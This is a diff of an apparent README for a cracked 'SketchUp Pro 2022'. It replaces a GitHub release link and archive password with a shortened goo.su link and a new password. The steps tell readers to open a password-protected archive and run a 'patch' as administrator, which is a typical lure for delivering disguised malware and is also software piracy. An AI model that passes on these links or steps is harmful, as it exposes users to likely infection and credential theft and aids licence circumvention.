@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install SketchUp Pro</H3>
 
-- [Download](https://github.com/tyerwdfehy/sketchup-pro-22/releases/download/download/SketchUpPro2022.rar)
-- Open archive (password: Sketch22)
+- [Download](https://goo.su/TdL3IM)
+- Open archive (password: Project12!)
 - Install SketchUp Pro 2022
 - Copy patch to installation directory
 - Open patch as admin, apply it will Patch SketchUp.exe Auto
